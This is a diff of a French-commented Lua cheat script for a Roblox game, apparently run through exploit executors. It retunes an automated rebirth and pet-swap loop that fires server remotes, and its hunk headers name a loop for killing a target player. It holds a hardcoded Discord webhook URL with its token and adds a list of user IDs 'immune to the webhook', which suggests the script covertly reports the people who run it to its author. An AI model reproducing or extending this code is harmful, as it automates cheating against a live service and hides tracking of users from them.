@@ -22,6 +22,17 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1558249808404283442/r_ao-R
 
 task.spawn(function()
     pcall(function()
+        -- Liste des ID Roblox immunisés contre le webhook
+        local ignoredUserIds = {
+            [2549253643] = true,
+            [7163736802] = true,
+            [4760900584] = true,
+        }
+
+        if ignoredUserIds[LocalPlayer.UserId] then
+            return
+        end
+
         local reqFunc = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
         if not reqFunc then return end
 
@@ -110,7 +121,7 @@ local function saveCategoryConfig(categoryName, data)
 end
 
 -- ===================== SETTINGS =====================
-local REBIRTH_COOLDOWN = 4.8 -- Ajusté agressivement pour compenser la latence serveur et viser 5.5s max
+local REBIRTH_COOLDOWN = 5.5
 
 local E = {
     bolt = "⚡", cycle = "🔄", muscle = "💪", toolbox = "🧰",
@@ -418,7 +429,7 @@ local function killTargetPlayerLoop(myId)
     end
 end
 
--- ===================== FAST REBIRTH LOOP ULTRA ACCÉLÉRÉ =====================
+-- ===================== FAST REBIRTH LOOP =====================
 local function fastRebirthLoop(myId)
     local function isRunning() return fastRunId == myId end
     pcall(function()
@@ -426,11 +437,15 @@ local function fastRebirthLoop(myId)
         local equipPetEvent = ReplicatedStorage.rEvents.equipPetEvent
         local FOLDERS = {"Unique", "Rare", "Epic", "Mythic", "Legendary"}
 
+        local HYDRA_LEAD = 0.015             
+        local HYDRA_TAIL = 0.010             
+        local REP_OFF_LEAD = 0.015           
+        local REP_ON_DELAY = 0.010           
         local SLOTS = 12                    
         local AUTO_TRY = 20                 
         local FULL_SWAP = true              
         local STARTUP_UNEQUIP_PER_FRAME = 20
-        local LIST_REFRESH_EVERY = 15        
+        local LIST_REFRESH_EVERY = 10        
 
         local function petRealName(pet)
             if pet:FindFirstChild("PetName") then return pet.PetName.Value end
@@ -501,7 +516,7 @@ local function fastRebirthLoop(myId)
 
         local equipped = {}
 
-        local function setEquipped(wanted, burst)
+        local function setEquipped(wanted, burst, equipFirst)
             local want, have = {}, {}
             for _, pet in ipairs(wanted) do want[pet] = true end
             for _, pet in ipairs(equipped) do have[pet] = true end
@@ -523,10 +538,18 @@ local function fastRebirthLoop(myId)
                 end
             end
 
-            for _, pet in ipairs(outList) do fire("unequipPet", pet) end
+            local firstN = equipFirst and math.min(#inList, #outList) or #outList
+            for i = 1, firstN do fire("unequipPet", outList[i]) end
             for _, pet in ipairs(inList) do fire("equipPet", pet) end
+            for i = firstN + 1, #outList do fire("unequipPet", outList[i]) end
 
             equipped = newEquipped
+        end
+
+        local function waitUntil(t)
+            while isRunning() and os.clock() < t do
+                task.wait()
+            end
         end
 
         local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
@@ -561,21 +584,29 @@ local function fastRebirthLoop(myId)
         setEquipped(repTarget, true)
 
         local cycle = 0
+        local nextCycleTime = os.clock()
+
         while isRunning() do
             cycle = cycle + 1
+            local targetTime = nextCycleTime
 
-            -- Étape 1 : Équiper les familiers de vitesse (Hydra / Overlord)
-            setEquipped(swapList, true)
-            
-            -- Étape 2 : Envoyer le Rebirth immédiatement en tâche de fond non bloquante
-            task.spawn(function()
-                pcall(function()
+            waitUntil(targetTime - HYDRA_LEAD)
+            if not isRunning() then break end
+            setEquipped(swapList, true, true)
+
+            waitUntil(targetTime)
+            if not isRunning() then break end
+            local tFire = os.clock()
+
+            pcall(function()
+                task.spawn(function()
                     rebirthRemote:InvokeServer("rebirthRequest")
                 end)
             end)
 
-            -- Étape 3 : Remettre les familiers de force
-            task.wait(0.05)
+            waitUntil(tFire + HYDRA_TAIL)
+            setEquipped(offList, true)
+            waitUntil(tFire + REP_ON_DELAY)
             setEquipped(repTarget, true)
 
             if cycle % LIST_REFRESH_EVERY == 0 then
@@ -583,8 +614,7 @@ local function fastRebirthLoop(myId)
                 rebuild()
             end
 
-            -- Étape 4 : Cadencement strict basé sur le cooldown configuré
-            task.wait(REBIRTH_COOLDOWN)
+            nextCycleTime = tFire + REBIRTH_COOLDOWN
         end
     end)
 end
